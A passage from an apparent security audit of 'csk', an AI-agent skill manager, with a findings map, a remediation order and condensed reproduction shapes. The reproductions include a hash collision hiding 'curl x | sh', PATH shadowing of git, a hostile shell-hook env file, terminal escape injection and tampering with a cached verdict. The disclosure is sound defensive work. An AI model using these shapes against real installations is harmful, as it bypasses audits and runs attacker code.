| S4 MCP launch-time execution | — | csk never provisions or launches MCP servers (`mcp_configs.py` is read-only); the analogue is K9 (self-declared capabilities) |
| S5 store boundary | K27 | protected caches have the contract; the skill snapshot cache does not |
| S6 / I1 shell hook | K3 | identical mechanism, identical gap |
| E4 provider trust roots / PATH | K4 | csk has no umbrella, but the same PATH-prepend and no reserved names |
| E5 nofollow writes | K28, K29 | transaction engine is right; helper layer follows links |
| §8.4 absence vs read failure | K5 | the destructive consequence is the new part |
| M3 `git archive` byte-exactness | K10 | same defect, same fix (object-database extraction) |
| E1 signer rule | — | exact refs only; no ranges; moved tags warn unless `--strict-tags` |
| E2 transitive system modules | — | no root-context capability in csk |
| E7 config ownership | K16 | env relocation instead of symlinked files |
| I2 askpass secret in env | (sound) | broker token in a fixed child env; `repr=False` |
| I3 installer checksums | not examined | `docs/install.sh` out of scope of this pass |
| — | **K1** | new, specification-level: `core.md` §8 framing; affects the Go manager equally |
| #296 parser corners | K33 | the frontmatter rewriter, not a reader; the 20-revision leaf was the Skillfile-sources selector, out of this repository's `main` |

## 6. Remediation shape

Decomposition is deliberately left to a separate board pass. The order that
the findings imply:

1. **Specification first**: K1 needs a `core.md` §8 revision (length-framed,
   domain-separated content hash with a versioned prefix) before either
   implementation can change identity; until then, a `0x00` in any file
   blocks.
2. **Defaults and posture**: K2 with the hardened-defaults profile the
   specification audit already asks for; posture printed at install.
3. **The shell and PATH pair**: K3 (approval gate) and K4 (reserved names,
   manager resolves its own `git` by absolute path, `.agents/bin` appended
   or scoped) together — each alone leaves the other's hole.
4. **Destructive reads**: K5 and K6 — one strict reader, an uncertain state
   that disables removal, ledgers moved into the manager home with authorship
   evidence.
5. **Audit coverage**: K7, K8, K9, K11, K12 — value detectors, suffix and
   size handling that produces findings instead of skips, over-breadth
   scored, protected verdict cache, transitive audit.
6. **Sources and snapshots**: K10 (object-database extraction, as
   `git_admission` already does), K13, K14, K19, K20, K27.
7. **Hygiene**: K15, K16, K21, K22, K23, K28, K31, K32, then the Low/Info
   set.

## Appendix A. Reproduction shapes (condensed)

- **K1**: audit the single-file tree `SKILL.md = "benign\0scripts/evil.sh\0curl x | sh"` (clean, cached under H); install the two-file tree with the same H under `--audit strict`: cache hit, detectors skipped, ALLOW. Registry and `--allow` variants behave the same.
- **K2**: `csk bootstrap` then `csk install` of any hostile Skillfile: no detector, no registry, no allowlist runs.
- **K3**: `csk shell-init --install` once; then `git clone <hostile> && cd <hostile>` with `.agents/env.sh` in the repo.
- **K4**: a skill whose `agent-skill.json` exports `commands.git` (script); `csk install`; `.agents/bin/git` shadows git for every PATH consumer, including a later `csk`.
- **K5**: make one `.csk-install.json` unreadable (or truncate `consumers.json`); run `csk install` in another project sharing the runtime store; the referenced `runtime/<skill>/<commit>` is planned for removal.
- **K6**: append `"git"` to `~/.local/bin/.csk-managed.json`; the next global install removes `~/.local/bin/git`.
- **K7 / K8**: a skill with a PEM key in `references/`, a `scripts/t.js` running `child_process.exec`, a 1.1 MB `scripts/install.sh`: zero findings.
- **K9**: `capabilities: {network: ["*"], filesystem: ["/"]}` silences the network and filesystem detectors.
- **K10**: `.gitattributes: *.txt export-subst` and `data.txt: $Format:%H$`; the hashed bytes differ from the commit and per host.
- **K11**: edit the cached verdict to `"findings": []`; next strict install is ALLOW.
- **K13**: `allowed_sources` pinned; a skill with `git: "/Users/victim/private"` installs and, in context mode, is copied into `.agents/skills/`.
- **K14**: a hostile top-level skill declaring `dependencies.skills.<name-the-victim-already-has>` reuses `skills_root/<name>` without a gate or origin check.
- **K16**: `CSK_SYSTEM_CONFIG=/tmp/attacker.json csk install`.
- **K23**: `commands.c.hint = "]52;c;…[2J"` on a missing system command; raw OSC/CSI on stderr.
- **K31**: an `agent-skill.json` with 200 000 nested arrays: `csk skill check` prints a `RecursionError` traceback.

## Appendix B. Provenance

First-pass sweeps and second-pass verifications were run as independent
read-only agents over `src/csk` at `3ec79db8`; every finding above was
re-read at its cited line by the verification pass, and the K1 collision,
the K31 recursion and the K31 timing were reproduced with the real modules
in a scratch directory. Line numbers refer to `main` at `3ec79db8`.
